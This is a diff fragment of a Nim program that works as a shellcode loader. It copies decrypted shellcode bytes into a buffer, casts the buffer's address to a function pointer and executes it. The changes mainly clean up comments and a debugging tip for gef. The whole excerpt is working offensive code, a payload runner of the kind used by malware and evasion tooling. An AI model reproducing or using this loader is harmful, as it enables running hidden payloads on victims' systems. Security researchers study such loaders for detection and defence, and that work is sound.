@@ -453,22 +453,18 @@ proc main(): void =
     #    ```
     #
 
-    # let fPtr = cast[ByteAddress](shellcode)
-
     for index, byte_value in decrypted_shellcode_bytes:
         shellcode_empty_array[index] = byte_value
     
-    let shellcode_pointer = cast[ByteAddress](shellcode_empty_array.addr)    
-
-    # I don't understand why the the address isn't correct
-    # there's an offset of 0x50 bytes between the real address and the one of unsafeAddr
-    # echo "[+] Address of shellcode: ", toHex(shellcode_pointer)
+    # get the address of the decrypted shellcode
+    let shellcode_pointer = cast[ByteAddress](shellcode_empty_array.addr)
     
-    # create function based on shellcode
+    # create a function pointing to this address
     var run_shellcode : (proc() {.cdecl, gcsafe.}) = cast[(proc() {.cdecl, gcsafe.})](shellcode_pointer)
 
-    # in my case the function echo is based on fwrite, so you set a breakpoint on:
-    #   gef> b *fwrite
+    # in my case the function echo is based on fwrite, so you can set a
+    #   breakpoint on fwrite if you want to check the shellcode:
+    #       gef> b *fwrite
     echo "[+] Running shellcode"
     run_shellcode()
 
